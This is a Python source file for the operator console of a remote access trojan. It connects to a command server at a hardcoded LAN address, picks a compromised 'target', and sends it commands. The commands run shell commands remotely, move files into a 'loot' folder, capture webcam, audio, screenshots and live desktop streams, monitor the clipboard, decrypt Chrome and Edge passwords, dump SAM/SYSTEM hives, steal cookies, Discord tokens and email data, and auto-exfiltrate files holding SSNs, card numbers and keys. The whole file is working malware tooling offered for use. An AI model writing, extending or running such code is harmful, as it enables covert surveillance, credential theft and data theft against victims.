import asyncio
import websockets
import ssl
import getpass
import sys
import base64

OP_ID = "operator1"

def print_help():
    """Display available commands"""
    help_text = """
╔═════════════════════════════════════════════════════════════════════════════╗
║                    AVAILABLE COMMANDS                                       ║
╠═════════════════════════════════════════════════════════════════════════════╣
║ SYSTEM COMMANDS (executed on the target):                                   ║
║   <command>                            Executes a shell command on target   ║
║                                                                             ║
║ FILE TRANSFER:                                                              ║
║   download <file>                      Downloads a file from the target     ║
║                                        → Saved to server/loot/              ║
║   upload <file>                        Uploads a file to the target         ║
║                                        ← From server/payloads/              ║
║                                                                             ║
║ MEDIA CAPTURE:                                                              ║
║   webcam                               Captures a photo via webcam          ║
║   record <seconds>                     Records audio (max 300s)             ║
║   screenshot                           Captures desktop live screenshot     ║
║   stream_start                         Start desktop live streaming         ║
║   stream_stop                          Stop desktop live streaming          ║
║                                                                             ║
║ CONTENT RECON:                                                              ║
║   search <pattern>                     Searches for files by name           ║
║                                        Examples: *.docx, password.txt       ║
║   search <pattern> --limit <N>         Limits results to N (default: 100)   ║
║   search --content <text>              Searches within content              ║
║   search --content <text> --limit <N>  Searches w/ custom limit             ║
║   sysinfo                              Collects system information          ║
║                                                                             ║
║ CLIPBOARD:                                                                  ║
║   clipboard                            Read clipboard contents              ║
║   clipboard set <txt>                  Set clipboard contents               ║
║   clipboard monitor <seconds>          Monitor (REQUIRED duration)          ║
║   clipboard check                      View new captures (while monitoring) ║
║                                                                             ║
║ CREDS COLLECTION:                                                           ║
║   creds wifi                           Retrieves WiFi passwords             ║
║   creds browsers                       Lists browser credentials            ║
║   creds edge_decrypt                   Decrypt Edge passwords (v10/v11)     ║
║   creds chrome_decrypt                 Decrypt Chrome passwords (v10/v11)   ║
║   creds registry_dump_vss              Dump SAM/SYSTEM/SECURITY (VSS)       ║
║   creds applications                   FTP, SSH credentials                 ║
║                                                                             ║
║ BROWSER DATA EXTRACTION:                                                    ║
║   browser history                      Extract browser history (first 50)   ║
║   browser history --save               Save all history to file             ║
║   browser cookies                      Extract browser cookies (first 50)   ║
║   browser cookies --save               Save all cookies to file (VSS)       ║
║   browser bookmarks                    Extract bookmarks (first 50)         ║
║   browser bookmarks --save             Save all bookmarks to file           ║
║   browser downloads                    Extract download history (first 50)  ║
║   browser downloads --save             Save all download history to file    ║
║                                                                             ║
║ SMART FILE EXFILTRATION:                                                    ║
║   exfil auto                           Auto-find sensitive files            ║
║   exfil patterns                       Search for SSN, credit cards, keys   ║
║   exfil compress <dir>                 Compress directory for exfil         ║
║                                                                             ║
║ EMAIL & MESSAGING EXTRACTION:                                               ║
║   msg email                            List email clients found             ║
║   msg windows_mail_export              Export Windows Mail database (VSS)   ║
║   msg thunderbird                      Extract Thunderbird data             ║
║   msg discord                          Extract Discord tokens               ║
║   msg slack                            Extract Slack workspace info         ║
║                                                                             ║
║ SHELL UPGRADING:                                                            ║
║   shell powershell                     Switch to PowerShell (Windows)       ║
║   shell bash                           Switch to Bash (Linux/macOS)         ║
║   shell zsh                            Switch to Zsh                        ║
║   shell python                         Check Python availability            ║
║   shell pty                            PTY upgrade info (Linux/macOS)       ║
║                                                                             ║
║ MANAGEMENT:                                                                 ║
║   ls_loot                              List files in loot/                  ║
║   ls_payloads                          List files in payloads/              ║
║   ls_downloads                         List files in downloads/             ║
║   flush                                Discard stale queued messages        ║
║   help                                 Display this help                    ║
║   exit / quit                          Exit the session                     ║
╚═════════════════════════════════════════════════════════════════════════════╝

Examples:
  >>> download /etc/passwd
  >>> search *.pdf --limit 50
  >>> search --content "password" --limit 200
  >>> sysinfo
  >>> clipboard
  >>> clipboard monitor 300
  >>> clipboard set "Hello from operator"
  >>> creds wifi
  >>> creds browsers
  
  New Features:
  >>> browser history
  >>> browser cookies
  >>> exfil auto
  >>> exfil patterns
  >>> exfil compress /home/user/Documents
  >>> msg email
  >>> msg discord
  >>> shell powershell
"""
    print(help_text)

async def main():
    # Configuration
    server_host = input("Server host [192.168.2.110]: ").strip() or "192.168.2.110"
    server_port = input("Server port [8765]: ").strip() or "8765"
    uri = f"wss://{server_host}:{server_port}"
    
    # Credentials
    print("\n--- Authentication ---")
    login = input("Login: ").strip()
    password = getpass.getpass("Password: ")
    
    if not login or not password:
        print("[ERROR] Login and password are required")
        sys.exit(1)
    
    ssl_context = ssl._create_unverified_context()
    
    try:
        async with websockets.connect(
            uri,
            ssl=ssl_context,
            ping_interval=None,
            max_size=100_000_000  # 50MB limit for files
        ) as websocket:
            
            print("[+] Connected to server")
            
            # Sending authentication
            auth_message = f"operator:{OP_ID}::{login}::{password}"
            await websocket.send(auth_message)
            
            # Receiving targets list
            response = await websocket.recv()
            
            if response.startswith("TARGET_LIST:"):
                # Parsing targets list
                targets_str = response.split(":", 1)[1]
                targets_list = [t.strip() for t in targets_str.split(",") if t.strip()]
                
                if not targets_list:
                    print("[!] No targets connected to the server")
                    return
                
                # Displaying targets list
                print("\n[+] Authentication successful")
                print("\n" + "="*60)
                print("  CONNECTED TARGETS")
                print("="*60)
                for i, target in enumerate(targets_list, 1):
                    print(f"  [{i}] {target}")
                print("="*60)
                
                # Asking selection of target
                selection = input("\nSelect target [number or name]: ").strip()
                
                # If a number, converting as a name
                if selection.isdigit():
                    index = int(selection) - 1
                    if 0 <= index < len(targets_list):
                        target_id = targets_list[index]
                    else:
                        print(f"[!] Invalid selection. Choose 1-{len(targets_list)}")
                        return
                else:
                    # Use the name directly
                    target_id = selection
                
                print(f"[*] Connecting to target: {target_id}")
                
            elif "Authentication successful" in response:
                # Older format (compatibility)
                print(f"[SERVER] {response}")
                target_id = input("\nTarget ID: ").strip()
            else:
                print(f"[!] Unexpected response: {response}")
                return
            
            # Sending the selected target_id
            await websocket.send(target_id)
            
            # Connection confirmation
            response = await websocket.recv()
            print(f"[SERVER] {response}")
            
            if "Connected to target" not in response:
                print("[!] Failed to connect to target")
                return
            
            print("\n" + "="*60)
            print("✓ Interactive session started")
            print("  Type 'help' for available commands")
            print("  Type 'exit' to quit")
            print("="*60 + "\n")
            
            # Streaming state
            streaming_active = False
            command_queue = asyncio.Queue()  # For command responses
            stream_queue = asyncio.Queue()   # For stream frames
            
            async def message_receiver():
                """Background task to receive all messages from server and route them"""
                try:
                    while True:
                        msg = await websocket.recv()
                        
                        # Route messages to appropriate queue
                        if msg.startswith("[STREAM]"):
                            await stream_queue.put(msg)
                        else:
                            await command_queue.put(msg)
                except asyncio.CancelledError:
                    pass
                except:
                    pass
            
            # Start background message receiver
            receiver_task = asyncio.create_task(message_receiver())
            
            # FIX 3: drain stale queued messages after errors so the next command
            # gets its own response instead of a leftover from the failed command
            def drain_queue(q):
                while not q.empty():
                    try:
                        q.get_nowait()
                    except asyncio.QueueEmpty:
                        break

            # Interactive session
            while True:
                try:
                    cmd = input(">>> ").strip()
                    
                    if not cmd:
                        continue
                    
                    if cmd.lower() in ("exit", "quit"):
                        receiver_task.cancel()
                        break
                    
                    if cmd.lower() == "help":
                        print_help()
                        continue
                    
                    if cmd.lower() == "flush":
                        count = command_queue.qsize()
                        drain_queue(command_queue)
                        print(f"[*] Flushed {count} queued message(s)")
                        continue
                    
                    # Processing file requests
                    if cmd.startswith("download "):
                        filename = cmd.split(" ", 1)[1]
                        await websocket.send(f"FILE_DOWNLOAD:{filename}")
                        print(f"[*] Requesting download: {filename}")
                    
                    elif cmd.startswith("upload "):
                        filename = cmd.split(" ", 1)[1]
                        await websocket.send(f"FILE_UPLOAD:{filename}")
                        print(f"[*] Uploading: {filename}")
                    
                    elif cmd == "ls_loot":
                        await websocket.send("FILE_LIST_LOOT")
                    
                    elif cmd == "ls_payloads":
                        await websocket.send("FILE_LIST_PAYLOADS")
                    
                    elif cmd == "ls_downloads":
                        await websocket.send("FILE_LIST_DOWNLOADS")
                        print(f"[*] Listing downloads directory...")
                    
                    elif cmd == "webcam":
                        await websocket.send("WEBCAM_CAPTURE")
                        print(f"[*] Capturing webcam...")
                    
                    elif cmd.startswith("record "):
                        try:
                            duration = int(cmd.split(" ", 1)[1])
                            if duration <= 0 or duration > 300:
                                print("[!] Duration must be between 1 and 300 seconds")
                                continue
                            await websocket.send(f"AUDIO_RECORD:{duration}")
                            print(f"[*] Recording {duration} seconds of audio...")
                        except (ValueError, IndexError):
                            print("[!] Usage: record <seconds>")
                            continue
                    
                    elif cmd.startswith("search "):
                        args = cmd.split(" ", 1)[1]
                        
                        # Parsing options
                        max_results = None
                        
                        # Check for --limit option
                        if "--limit " in args:
                            import re
                            limit_match = re.search(r'--limit\s+(\d+)', args)
                            if limit_match:
                                max_results = limit_match.group(1)
                                args = re.sub(r'--limit\s+\d+\s*', '', args).strip()
                        
                        # Check for --content option
                        if args.startswith("--content "):
                            content = args.split(" ", 1)[1]
                            # FIX: use SEARCH_CONTENT: prefix instead of SEARCH_FILES:*:content
                            if max_results:
                                await websocket.send(f"SEARCH_CONTENT:*:{content}:{max_results}")
                                print(f"[*] Searching for content: {content} (limit: {max_results})")
                            else:
                                await websocket.send(f"SEARCH_CONTENT:*:{content}")
                                print(f"[*] Searching for content: {content}")
                        else:
                            pattern = args
                            if max_results:
                                await websocket.send(f"SEARCH_FILES:{pattern}:{max_results}")
                                print(f"[*] Searching for files: {pattern} (limit: {max_results})")
                            else:
                                await websocket.send(f"SEARCH_FILES:{pattern}")
                                print(f"[*] Searching for files: {pattern}")
                    
                    elif cmd == "sysinfo":
                        await websocket.send("SYSINFO_GATHER")
                        print(f"[*] Gathering system information...")
                    
                    elif cmd == "clipboard":
                        await websocket.send("CLIPBOARD:get")
                        print(f"[*] Reading clipboard...")
                    
                    elif cmd.startswith("clipboard set "):
                        text = cmd.split(" ", 2)[2]
                        b64_text = base64.b64encode(text.encode('utf-8')).decode('utf-8')
                        await websocket.send(f"CLIPBOARD:set:{b64_text}")
                        print(f"[*] Setting clipboard...")
                    
                    elif cmd.startswith("clipboard monitor"):
                        # Format: clipboard monitor <duration>
                        parts = cmd.split()
                        
                        # Duration is REQUIRED
                        if len(parts) < 3:
                            print("[!] Error: Duration required")
                            print("[!] Usage: clipboard monitor <seconds>")
                            print("[!] Examples:")
                            print("[!]   clipboard monitor 300    (5 minutes)")
                            print("[!]   clipboard monitor 3600   (1 hour)")
                            print("[!]   clipboard monitor 28800  (8 hours)")
                            continue
                        
                        try:
                            duration = int(parts[2])
                            if duration <= 0:
                                print("[!] Error: Duration must be positive")
                                continue
                        except ValueError:
                            print("[!] Error: Invalid duration (must be a number)")
                            continue
                        
                        print(f"[*] Monitoring clipboard for {duration} seconds...")
                        print(f"[*] Clipboard updates will appear as you use commands")
                        print(f"[*] Use 'clipboard check' to see new captures")
                        
                        # Send monitoring command
                        await websocket.send(f"CLIPBOARD_MONITOR:{duration}")
                        
                        # FIX 2: use command_queue instead of websocket.recv() directly —
                        # message_receiver already owns recv(); two concurrent recv() calls crash
                        start_msg = await asyncio.wait_for(command_queue.get(), timeout=5.0)
                        print(start_msg)
                        
                        # Don't block - just continue to prompt
                        # User can use 'clipboard check' to poll for updates
                        continue
                    
                    elif cmd == "clipboard check":
                        # Poll for new clipboard entries
                        # This uses a stored index in the session
                        if not hasattr(websocket, '_clipboard_index'):
                            websocket._clipboard_index = 0
                        
                        await websocket.send(f"CLIPBOARD_HISTORY:{websocket._clipboard_index}")
                        
                        # Receive entries
                        entries_found = 0
                        while True:
                            try:
                                # FIX: use command_queue, not websocket.recv() directly —
                                # message_receiver already owns recv()
                                msg = await asyncio.wait_for(command_queue.get(), timeout=2.0)
                                
                                if msg.startswith("CLIPBOARD_HISTORY_ENTRY:"):
                                    # Format: CLIPBOARD_HISTORY_ENTRY:timestamp:b64_content
                                    # FIX 1: removed local 'import base64' — caused "referenced before assignment"
                                    # for clipboard set, because Python treats any in-function import as local
                                    data = msg[len("CLIPBOARD_HISTORY_ENTRY:"):]
                                    timestamp = data[:19]
                                    b64_content = data[20:]
                                    
                                    # Decode content
                                    try:
                                        decoded_bytes = base64.b64decode(b64_content)
                                        content = decoded_bytes.decode('utf-8')
                                    except:
                                        try:
                                            content = decoded_bytes.decode('utf-8', errors='replace')
                                        except:
                                            content = decoded_bytes.decode('latin-1', errors='ignore')
                                    
                                    print(f"[{timestamp}] Copied: {content}")
                                    entries_found += 1
                                
                                elif msg.startswith("CLIPBOARD_HISTORY_COMPLETE:"):
                                    # Update index
                                    new_index = int(msg.split(":", 1)[1])
                                    old_index = websocket._clipboard_index
                                    websocket._clipboard_index = new_index
                                    
                                    # Show message if no new entries
                                    if entries_found == 0:
                                        if old_index == 0:
                                            print("[*] No clipboard captures yet")
                                        else:
                                            print("[*] No new clipboard captures")
                                    break
                                
                                elif msg.startswith("CLIPBOARD_HISTORY_ERROR:"):
                                    error = msg.split(":", 1)[1]
                                    print(f"[!] Error: {error}")
                                    break
                            
                            except asyncio.TimeoutError:
                                if entries_found == 0:
                                    print("[!] Timeout waiting for clipboard history")
                                break
                        
                        continue
                    
                    elif cmd.startswith("creds "):
                        # Format: creds <type> where type = wifi, browsers, applications, edge_decrypt, chrome_decrypt, registry_dump_vss
                        parts = cmd.split()
                        if len(parts) == 2:
                            cred_type = parts[1]
                            if cred_type in ['wifi', 'browsers', 'applications', 'edge_decrypt', 'chrome_decrypt', 'registry_dump_vss']:
                                await websocket.send(f"CREDS:{cred_type}")
                                print(f"[*] Harvesting {cred_type} credentials...")
                            else:
                                print(f"[!] Invalid credential type. Use: wifi, browsers, applications, edge_decrypt, chrome_decrypt, registry_dump_vss")
                                continue
                        else:
                            print(f"[!] Usage: creds <type>")
                            print(f"[!] Types: wifi, browsers, applications, edge_decrypt, chrome_decrypt, registry_dump_vss")
                            continue
                    
                    elif cmd == "screenshot":
                        await websocket.send("SCREENSHOT")
                        print(f"[*] Capturing screenshot...")
                    
                    elif cmd == "stream_start":
                        streaming_active = True
                        await websocket.send("STREAM_START")
                        print(f"[*] Starting desktop stream...")
                        
                        # Consume the immediate response from command queue
                        try:
                            initial_response = await asyncio.wait_for(command_queue.get(), timeout=5.0)
                            print(initial_response)
                        except asyncio.TimeoutError:
                            print("[!] No response from server")
                        
                        print(f"[*] Stream frames will be saved in loot/ directory")
                        print(f"[*] You can continue using commands while streaming")
                        print(f"[*] Use 'stream_stop' to end the stream\n")
                        
                        # Start background task to consume stream frames
                        async def stream_monitor():
                            frame_count = 0
                            while streaming_active:
                                try:
                                    msg = await asyncio.wait_for(stream_queue.get(), timeout=0.5)
                                    frame_count += 1
                                    # Print every 10th frame to avoid spam
                                    if frame_count % 10 == 0:
                                        print(f"\r{msg}", flush=True)
                                except asyncio.TimeoutError:
                                    continue
                                except Exception as e:
                                    print(f"[STREAM MONITOR ERROR] {e}")
                                    break
                        
                        asyncio.create_task(stream_monitor())
                        continue
                    
                    elif cmd == "stream_stop":
                        streaming_active = False
                        await websocket.send("STREAM_STOP")
                        print(f"[*] Stopping desktop stream...")
                        
                        # Wait a moment for stream monitor to finish
                        await asyncio.sleep(0.5)
                        
                        # Consume the immediate response from command queue
                        try:
                            response = await asyncio.wait_for(command_queue.get(), timeout=5.0)
                            print(response)
                        except asyncio.TimeoutError:
                            pass
                        
                        continue
                    
                    # ======== NEW FEATURE COMMANDS ========
                    
                    elif cmd.startswith("browser "):
                        # Format: browser <type> [--save] where type = history, cookies, bookmarks, downloads, debug
                        parts = cmd.split()
                        if len(parts) >= 2:
                            data_type = parts[1]
                            save_to_file = '--save' in parts
                            
                            if data_type in ['history', 'cookies', 'bookmarks', 'downloads', 'debug']:
                                if data_type == 'debug':
                                    await websocket.send("BROWSER_DEBUG")
                                    print(f"[*] Getting browser debug info...")
                                else:
                                    if save_to_file:
                                        await websocket.send(f"BROWSER_DATA:{data_type}:save")
                                        print(f"[*] Extracting browser {data_type} and saving to file...")
                                    else:
                                        await websocket.send(f"BROWSER_DATA:{data_type}")
                                        print(f"[*] Extracting browser {data_type}...")
                            else:
                                print(f"[!] Invalid data type. Use: history, cookies, bookmarks, downloads, debug")
                                continue
                        else:
                            print(f"[!] Usage: browser <type> [--save]")
                            print(f"[!] Types: history, cookies, bookmarks, downloads, debug")
                            print(f"[!] Options: --save (save complete listing to file)")
                            print(f"[!] Examples:")
                            print(f"[!]   browser history          (show first 50 entries)")
                            print(f"[!]   browser history --save   (save all to file)")
                            print(f"[!]   browser bookmarks --save (save all to file)")
                            continue
                    
                    elif cmd.startswith("exfil "):
                        # Format: exfil <mode> [args]
                        parts = cmd.split(maxsplit=2)
                        if len(parts) >= 2:
                            mode = parts[1]
                            args = parts[2] if len(parts) > 2 else ""
                            
                            if mode in ['auto', 'patterns']:
                                await websocket.send(f"EXFIL:{mode}")
                                print(f"[*] Smart exfiltration mode: {mode}")
                            elif mode == 'compress' and args:
                                await websocket.send(f"EXFIL:compress:{args}")
                                print(f"[*] Compressing directory: {args}")
                            else:
                                print(f"[!] Usage:")
                                print(f"[!]   exfil auto           - Auto-find sensitive files")
                                print(f"[!]   exfil patterns       - Search for SSN, credit cards, keys")
                                print(f"[!]   exfil compress <dir> - Compress directory")
                                continue
                        else:
                            print(f"[!] Usage: exfil <mode> [args]")
                            continue
                    
                    elif cmd.startswith("msg "):
                        # Format: msg <type> where type = email, thunderbird, discord, slack, windows_mail_export
                        parts = cmd.split()
                        if len(parts) == 2:
                            msg_type = parts[1]
                            
                            # Map user-friendly names to actual types
                            type_map = {
                                'email': 'email_list',
                                'thunderbird': 'email_thunderbird',
                                'discord': 'discord',
                                'slack': 'slack',
                                'windows_mail_export': 'windows_mail_export'
                            }
                            
                            if msg_type in type_map:
                                actual_type = type_map[msg_type]
                                await websocket.send(f"MSG:{actual_type}")
                                print(f"[*] Extracting {msg_type} data...")
                            else:
                                print(f"[!] Invalid message type. Use: email, thunderbird, discord, slack")
                                continue
                        else:
                            print(f"[!] Usage: msg <type>")
                            print(f"[!] Types: email, thunderbird, discord, slack")
                            continue
                    
                    elif cmd.startswith("shell "):
                        # Format: shell <type> where type = powershell, bash, zsh, python, pty
                        parts = cmd.split()
                        if len(parts) == 2:
                            shell_type = parts[1]
                            if shell_type in ['powershell', 'bash', 'zsh', 'python', 'pty']:
                                await websocket.send(f"SHELL_UPGRADE:{shell_type}")
                                print(f"[*] Checking shell upgrade: {shell_type}")
                            else:
                                print(f"[!] Invalid shell type. Use: powershell, bash, zsh, python, pty")
                                continue
                        else:
                            print(f"[!] Usage: shell <type>")
                            print(f"[!] Types: powershell, bash, zsh, python, pty")
                            continue
                    
                    else:
                        # Check for dangerous commands that will hang the session
                        dangerous_commands = {
                            'powershell': 'Use shell commands with arguments or try: shell powershell',
                            'cmd': 'Use shell commands with arguments (e.g., "cmd /c dir")',
                            'bash': 'Use shell commands with arguments or try: shell bash',
                            'zsh': 'Use shell commands with arguments or try: shell zsh',
                            'python': 'Use shell commands with arguments (e.g., "python --version") or try: shell python',
                            'ssh': 'SSH will hang. Use with full arguments (e.g., "ssh user@host command")',
                            'ftp': 'FTP will hang. Avoid interactive sessions.',
                            'telnet': 'Telnet will hang. Avoid interactive sessions.',
                            'vi': 'Interactive editors will hang. Use non-interactive tools.',
                            'vim': 'Interactive editors will hang. Use non-interactive tools.',
                            'nano': 'Interactive editors will hang. Use non-interactive tools.',
                            'more': 'Interactive pagers will hang. Use "type" or "cat" instead.',
                            'less': 'Interactive pagers will hang. Use "type" or "cat" instead.'
                        }
                        
                        # Check if command is exactly one of the dangerous commands (no arguments)
                        cmd_lower = cmd.lower().strip()
                        if cmd_lower in dangerous_commands:
                            print(f"[!] Error: '{cmd}' without arguments will hang the session!")
                            print(f"[!] {dangerous_commands[cmd_lower]}")
                            continue
                        
                        # Normal shell command
                        await websocket.send(cmd)
                    
                    # Receive the reply from command queue (with timeout)
                    try:
                        result = await asyncio.wait_for(command_queue.get(), timeout=120.0)
                        print(result)
                    except asyncio.TimeoutError:
                        print("[!] Command timeout - no response received")
                        drain_queue(command_queue)
                
                except websockets.exceptions.ConnectionClosed:
                    print("[!] Connection closed")
                    break
                except KeyboardInterrupt:
                    print("\n[!] Interrupted")
                    break
                except Exception as e:
                    print(f"[ERROR] {e}")
                    drain_queue(command_queue)
    
    except websockets.exceptions.InvalidStatusCode as e:
        print(f"[ERROR] Connection rejected: {e}")
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == "__main__":
    asyncio.run(main())